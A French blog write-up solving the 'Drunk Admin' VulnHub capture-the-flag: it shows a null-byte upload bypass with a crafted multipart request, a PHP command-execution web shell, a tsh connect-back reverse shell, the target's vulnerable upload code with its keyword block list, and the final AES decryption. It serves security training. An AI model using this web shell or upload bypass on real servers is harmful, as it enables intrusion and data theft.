# Solution du CTF Drunk Web Admin

Introduction
------------

J'ai décidé de m'attaquer [à ce CTF au nom amusant](http://vulnhub.com/entry/drunk-admin-web-hacking-challenge-1,14/) qui s'est révélé plus intéressant que ce que je pensais.  

Comme quoi l'admin ne doit pas être si saoul que cela :)  

Pour ce CTF on dispose d'une mission bien particulière :  

> The challenge includes an image hosting web service that has various design vulnerabilities. You must enumerate the various web service features and find an exploitable vulnerability in order to read system hidden files. The web application is 100% custom so do not try to search google for relative PoC exploit code.
> 
> FINAL GOAL: Reveal the hidden message for a date arrange that Bob sent to Alice.

Apéro
-----

Le scan des ports indique qu'un serveur web écoute sur le port 8880 en plus du serveur SSH. Les autres ports sont filtrés donc on aura peut-être à utiliser un reverse shell.  

```plain
Nmap scan report for 192.168.1.30
Host is up (0.00019s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze1 (protocol 2.0)
| ssh-hostkey: 
|   1024 57:a2:04:3d:6e:e5:01:7b:b4:c6:e5:f9:76:25:8a:8a (DSA)
|_  2048 66:9a:ee:a2:2a:1a:59:47:b9:c5:50:da:a6:96:76:16 (RSA)
8880/tcp open  http    Apache httpd 2.2.16 ((Debian))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Tripios
```

Sur le port non standard 8880 on trouve un site web au look plutôt professionnel qui, comme indiqué dans la description, permet d'héberger des images.  

En plus de toute la partie upload on trouve une section "PHP" dont l'addresse est */myphp.php?id=102* et sur laquelle on peut lire "PHP Credits".  

On teste quelques valeurs et on voit par exemple avec un id de 104 on obtient la section "PHP Core" du phpinfo().  

Un petit tour [sur la page de manuel de phpinfo()](http://php.net/manual/fr/function.phpinfo.php) et on comprend que la valeur passée à id correspond à la valeur passée à phpinfo() + 100.  

Ainsi si on passe 99 on obtient la totalité de la configuration PHP du serveur.  

Cela nous permet d'obtenir des informations importantes comme les fonctions désactivées :  

*disable\_functions system, passthru, popen, proc\_open, pcntl\_exec, shell\_exec, fsockopen, python\_eval, perl->system*  

l'utilisateur utilisé pour les scripts (*www-data(33)/33*), la racine du serveur web (*/var/www*), le fait que *Suhosin* est présent et le path des logs (*/var/log/apache2*).  

Dans la partie Info du site on a juste le message suivant :  

> Developer was really drunk while writting these code lines. Act like a pro and report any security flaws that you spotted around.

Passons à la partie upload : quand on soumet une image (formulaire à destination d'*upload.php*) on est ensuite redirigé vers *image.php* qui affiche l'image uploadée dans un tag img.  

L'adresse de l'image est elle du type */images/d2ed89e532819858906317b4082a3055.jpg* (pour une image jpg).  

On tente alors l'attaque la plus basique : uploader directement un fichier php.  

La réponse ne se fait pas tarder : **Invalid file extension!**  

On obtient la même erreur avec un nom de fichier comme *truc.nawak*. Il semble donc qu'il y ait un système de liste blanche d'extensions.  

J'essaye d'uploader une backdoor PHP basique (*<?php system($\_GET['cmd']); ?>*) avec l'extension *.php.png*, cette fois j'ai l'erreur suivante :  

**Ohhh you are naughty!**  

Bon, regarderait-il si l'extension *.php* est présente quelque soit son emplacement dans le nom de fichier ?  

J'essaye avec *.pHp.png*, *.phtml.png*... et même simplement *.png* et je me rend compte que j'obtiens toujours la même erreur.  

Le nom du fichier (bien qu'important) n'est pas ce qui bloque, c'est donc soit le content-type envoyé par le navigateur, soit le contenu même du fichier.  

Je modifie la backdoor pour mettre *<?php readile("/etc/passwd"); ?>* et cette fois l'upload fonctionne avec l'extension *.png*.  

En revanche quand j'appelle l'image via *curl* on voit clairement que le serveur n’interprète pas le PHP car il considère le fichier comme une image :  

```plain
HTTP/1.1 200 OK
Server: Apache/2.2.16 (Debian)
Content-Length: 33
Content-Type: image/png

<?php readile("/etc/passwd"); ?>
```

Il y a autre chose de particulier dans l'affichage de l'image après upload, c'est le fait que l'on ne voit pas passer directement le nom de l'image dans l'URL.  

Avec un sniffer (ou proxy web applicatif ou outil de développement du navigateur) on observe le fonctionnement suivant :  

L'upload d'une image via *upload.php* retourne un entête *Set-Cookie* du type *trypios=8b5cb558df4975b840dc6bfadc689530* ainsi que le contenu web suivant :

```html
<script type="text/javascript"> window.location = "http://192.168.1.30:8880/image.php" </script>
```

Le navigateur enchaîne donc sur */image.php* avec le nouveau cookie. La page retourne un html avec un tag *img* qui reprend la valeur envoyée par le cookie.  

Au passage le cookie est réinitialisé (*Set-Cookie: trypios=uploader*) en vue d'un prochain upload.  

D'où vient le hash de l'image utilisé comme valeur de cookie et comme nom de l'image uploadée ? Si on envoie deux fois de suite la même image, le hash sera le même.  

En revanche si on renvoie toujours la même image mais avec un nom différent le hash change. Après vérification le hash correspond en effet à la somme MD5 du nom de fichier original.  

On remarque aussi une particularité concernant le dossier */images/* où sont stockées les images uploadés :  

Si on remplace l'extension *png* par *php* dans la barre d'adresse du navigateur on obtient une erreur 403 (accès refusé) alors que si on met une extension au hasard (.truc) on obtient un 404.  

Il en va de même avec des fichiers inexistants : 403 pour */images/whatever.php*, 404 pour */images/whatever.truc*.  

On est donc en présence d'une directive Apache (probablement un *htaccess*) qui bloque l'accès aux fichiers *php* dans ce dossier.  

A noter que l'extension *.phtml* n'est pas bloquée et retourne un 404 pour un fichier inexistant.  

Seulement il ne suffit pas d'envoyer un fichier en .phtml.png pour qu'il soit accessible avec l'extension *.phtml* dans */images/*.  

Il faut donc ruser sur l'extension.  

Envoie sa sœur
--------------

Pour cette opération j'ai eu recours à [Charles Proxy](http://www.charlesproxy.com/). La version d'essai suffit.  

Il doit être possible d'utiliser des outils similaires comme *Zed Attack Proxy* ou *Burp* mais j'ai pris l'habitude de *Charles* qui est très évolué.  

Après voir configuré *Charles* comme proxy HTTP intercepteur et fait un upload de la backdoor en *.png.html*, on édite la requête HTTP pour modifier l'extension en *.png%00.phtml* (on injecte un octet nul) :  

```plain
POST /upload.php HTTP/1.1
Host: 192.168.1.30:8880
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: text
Referer: http://192.168.1.30:8880/index.php
Cookie: trypios=nop
Connection: keep-alive
Content-Type: multipart/form-data; boundary=charles-multipart1403440237845-41248
Content-Length: 333

--charles-multipart1403440237845-41248
Content-Disposition: form-data; name="image"; filename="bd.png%00.phtml"
Content-Type: application/php

<? readfile("/etc/passwd"); ?>

--charles-multipart1403440237845-41248
Content-Disposition: form-data; name="Submit"

Host My Awesome Image
--charles-multipart1403440237845-41248--
```

Quand on demande l'image uploadée avec l'extension *.phtml* le PHP est bien exécuté mais un content-type d'image est toujours spécifié par le serveur.  

Avec curl on obtient plus facilement l'output :  

```plain
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/false
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/false
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/false
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
mysql:x:104:107:MySQL Server,,,:/var/lib/mysql:/bin/false
```

On réitère l'opération d'upload mais cette fois notre script accepte comme argument le chemin du fichier à lire.  

Ainsi on retrouve dans *index.php* :  

```plain
          <p>Uploaded Images: <?php echo exec("find /var/www/images/ -type f | wc -l"); ?><br />
             Total Used Space: <?php echo exec("du -hs /var/www/images/ | cut -f1"); ?></p>
```

Et dans *upload.php* :  

```php
function getExtension($str) {
    $i = strrpos($str,".");
    if (!$i) { return ""; }
    $l = strlen($str) - $i;
    $ext = substr($str,$i+1,$l);
    return $ext;
 }

//--- snip ---
if ($image) {
    $filename = stripslashes($_FILES['image']['name']);
    $extension = getExtension($filename);
    $extension = strtolower($extension);
    if (preg_match("/^.*\.(bmp|jpeg|gif|png|jpg).*$/i", $filename)) {
	$size=filesize($_FILES['image']['tmp_name']);
	if ($size > MAX_SIZE*1024) {
	    echo '<h1>You have exceeded the size limit!</h1>';
	    $errors=1;
	}
	$raw_name=md5($image);
	$image_name=md5($image).'.'.$extension;
	$newname="images/".$image_name;
	$copied = copy($_FILES['image']['tmp_name'], $newname);
	if (!$copied) {
	    echo '<h1>Copy unsuccessful!</h1>';
	    $errors=1;
	}
    }
    else {
	echo '<h1>Invalid file extension!</h1>';
	$errors=1;
    }
}
//--- snip ---
$file = file_get_contents("./images/$image_name");
if( strpos($file,"perl") ||
    strpos($file,"bash") ||
    strpos($file,"sh -c") ||
    strpos($file,"python") ||
    strpos($file,"nc ") ||
    strpos($file,"netcat") ||
    strpos($file,"base64") ||
    strpos($file,"ruby") ||
    strpos($file,"fsockopen") ||
    strpos($file,"xterm") ||
    strpos($file,"gcc") ||
    strpos($file,'$_GET') ||
    strpos($file,'$_POST') ||
    strpos($file,'$_SERVER') ||
    strpos($file,'$_FILES') ||
    strpos($file,'$_COOKIE') )
{ 
    echo "<h1>Ohhh you are naughty!</h1>"; 
    exec("rm ./images/$image_name");
    die;
}
```

Quand au *.htaccess* dans */images* :  

```plain
<Files *.php>
  RewriteEngine On
  RewriteBase /images/
  RewriteCond %{HTTP_COOKIE} !trypios.* [NC]
  RewriteRule ^.*$ /xmm.html [F]
</Files>
```

On a donc deux possibilités pour exécuter des commandes : soit envoyer un script PHP appelant *exec()* qui n'est pas désactivé et utilisant *$\_REQUESTS* qui n'est pas filtré, soit exploiter une seconde vulnérabilité présente dans *upload.php* (injection de commande via la variable *$variable\_name*, voir plus haut).  

J'ai préféré utiliser la première méthode. Notez aussi que dans la configuration PHP on voyait aussi que les tags PHP courts étaient activés.  

Du coup j'ai écrit la backdoor suivante :  

```php
<?                                                                                                                                                          
  exec($_REQUEST["cmd"], $response);                                                                                                                        
  foreach($response as $line) {                                                                                                                             
      echo "$line\n";                                                                                                                                       
  }                                                                                                                                                         
?>
```

Un upload et une exécution de *tshd* en mode connect-back plus tard (*/images/\_hash\_.phtml?cmd=setsid%20./tshcbd*) :  

```plain
$ ./tsh cb
Waiting for the server to connect...connected.
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/var/www/images
```

Dans */var/www*, on découvre un fichier *.proof* avec le contenu suivant :  

```plain
#########################
# Drunk Admin Challenge #
#     by @anestisb      #
#########################

bob> Great work.
bob> Meet me there.
...> ?
bob> What? You don't know where?
bob> Work a little more your post
     exploitation skills.

Secret Code:
TGglMUxecjJDSDclN1Ej

Mail me your methods at:
anestis@bechtsoudis.com
```

Une dernière pour la route
--------------------------

Malheureusement cette information ne nous permet pas de terminer la mission.  

On fouille plus on finit par trouver des fichiers dans le dossier web de l'utilisateur *bob* :  

```plain
./bob/public_html:
total 20
drwxr-xr-x 3 bob bob 4096 Mar  6  2012 .
drwxr-xr-x 4 bob bob 4096 Mar  6  2012 ..
-rw-r--r-- 1 bob bob 1730 Mar  6  2012 encrypt.php
drwxr-xr-x 2 bob bob 4096 Mar  6  2012 include
-rw-r--r-- 1 bob bob  791 Mar  6  2012 index.php

./bob/public_html/include:
total 24
drwxr-xr-x 2 bob bob 4096 Mar  6  2012 .
drwxr-xr-x 3 bob bob 4096 Mar  6  2012 ..
-rw-r--r-- 1 bob bob 7451 Mar  6  2012 aes.class.php
-rw-r--r-- 1 bob bob 7652 Mar  6  2012 aesctr.class.php
-rw-r--r-- 1 bob bob    0 Mar  6  2012 index.html
```

Le contenu du fichier *index.php* est (en retirant la partie html) le suivant :  

```php
<?php 
require 'include/aes.class.php';
require 'include/aesctr.class.php';

$cipher = 'bf0OvfUkVk+AJq8e+jbVlDdCYQoNVa9/eCCt+3y6qLb8jPdH6O43QlxAo80H2EASR8UKH9zVHDQ2aHZUoahc7dqTcGRcwCURwBWWew==';

if(isset($_POST['sc']) && isset($_POST['decr'])) {
    $decr = AesCtr::decrypt($cipher, $_POST['sc'], 256);
    echo $decr;
    die;
}
?>
```

Mais lors de la saisie du code secret vu plus haut dans le formulaire on obtient un parfais charabia de données...  

Les problèmes les plus simples étant parfois les moins évidents, j'ai mis du temps avant de comprendre que le secret était encodé en base64.  

Ainsi si on rentre la version décodée du secret (*Lh%1L^r2CH7%7Q#*) on obtient cette fois le message :  

> Alice, prepare for a kinky night. Meet me at '35.517286' '24.017637'

Lorsqu'on rentre ces coordonnées (sans les apostrophes) dans *Google Maps*, cela correspond à une ville de la *Crète* (l'île grecque).  

Heureusement pour *Bob* et *Alice*, ce n'est pas *Mykonos* :p

*Published June 29 2014 at 17:09*